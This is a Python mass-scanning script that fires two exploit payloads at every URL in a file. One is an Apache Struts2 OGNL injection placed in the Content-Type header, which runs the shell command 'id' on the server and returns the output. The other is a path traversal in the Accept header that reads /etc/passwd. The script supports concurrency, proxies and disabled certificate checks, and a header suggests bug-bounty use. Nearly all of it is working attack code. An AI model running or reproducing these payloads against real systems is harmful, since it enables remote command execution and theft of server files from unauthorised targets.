import requests
import argparse
import urllib3
import time
import concurrent.futures

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_help():
    print("Usage: python3 script.py -l <url_file> [--proxy <proxy>] [--method <method>] [-d/--delay <delay>] [-c/--concurrency <concurrency>] [-t/--timeout <timeout>] [-q/--silent]")



def check_cve_2017(url, proxy, method, delay, timeout, silent, headers):

    headers = {
        "Content-Type": "%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "X-Request-Purpose": "BugcrowdResearch",
        "Accept-Language": "en-US,en;q=0.9",

    }

    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    if method == "GET":
        response = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=timeout)
    else:
        response = requests.post(url, headers=headers, proxies=proxies, verify=False, timeout=timeout)

    if "uid" in response.text and "gid" in response.text and "groups" in response.text:
        if not silent:
            print(f"{url} - Vulnerable")
    else:
        if not silent:
            print(f"{url} - Not vulnerable")

    time.sleep(delay / 1000)

def check_cve_2019(url, proxy, method, delay, timeout, silent, headers):

    headers = {
        "Accept": "../../../../../../../../etc/passwd{{",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "X-Request-Purpose": "BugcrowdResearch",
        "Accept-Language": "en-US,en;q=0.9",
    }

    proxies = {
        "http": proxy,
        "https": proxy
    } if proxy else None

    if method == "GET":
        response = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=timeout)
    else:
        response = requests.post(url, headers=headers, proxies=proxies, verify=False, timeout=timeout)

    if "root:x" in response.text:
        if not silent:
            print(f"{url} - Vulnerable")
    else:
        if not silent:
            print(f"{url} - Not vulnerable")

    time.sleep(delay / 1000)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--url-file", dest="url_file", help="Specify the file containing URLs", required=True)
    parser.add_argument("--proxy", dest="proxy", help="Specify the proxy (e.g., http://proxy.example.com:8080)")
    parser.add_argument("--method", dest="method", help="Specify the HTTP method (GET or POST)", default="GET")
    parser.add_argument("-d", "--delay", dest="delay", help="Specify the delay between issuing requests in milliseconds (default: 0)", type=int, default=0)
    parser.add_argument("-c", "--concurrency", dest="concurrency", help="Set the concurrency level (default: 20)", type=int, default=20)
    parser.add_argument("-t", "--timeout", dest="timeout", help="Set the timeout for each request in seconds (default: 20)", type=int, default=20)
    parser.add_argument("-q", "--silent", dest="silent", help="Silent mode: print only vulnerable URLs", action="store_true")
    args = parser.parse_args()

    url_file = args.url_file
    proxy = args.proxy
    method = args.method.upper()
    delay = args.delay
    concurrency = args.concurrency
    timeout = args.timeout
    silent = args.silent

    if method not in ["GET", "POST"]:
        print("Invalid HTTP method. Please use 'GET' or 'POST'.")
        exit(1)

    try:
        with open(url_file, "r") as f:
            urls = f.read().splitlines()

        print("Choose vulnerability type:")
        print("1 - CVE-2017")
        print("2 - CVE-2019")
        vulnerability_choice = input("Enter your choice: ")

        if vulnerability_choice == "1":
            with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
                executor.map(
                    lambda url: check_cve_2017(url, proxy, method, delay, timeout, silent, {}),
                    urls
                )
        elif vulnerability_choice == "2":
            with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
                executor.map(
                    lambda url: check_cve_2019(url, proxy, method, delay, timeout, silent, {}),
                    urls
                )
        else:
            print("Invalid vulnerability choice")
            exit(1)

    except FileNotFoundError as e:
        print(f"File not found: {e.filename}")
        exit(1)

if __name__ == "__main__":
    main()
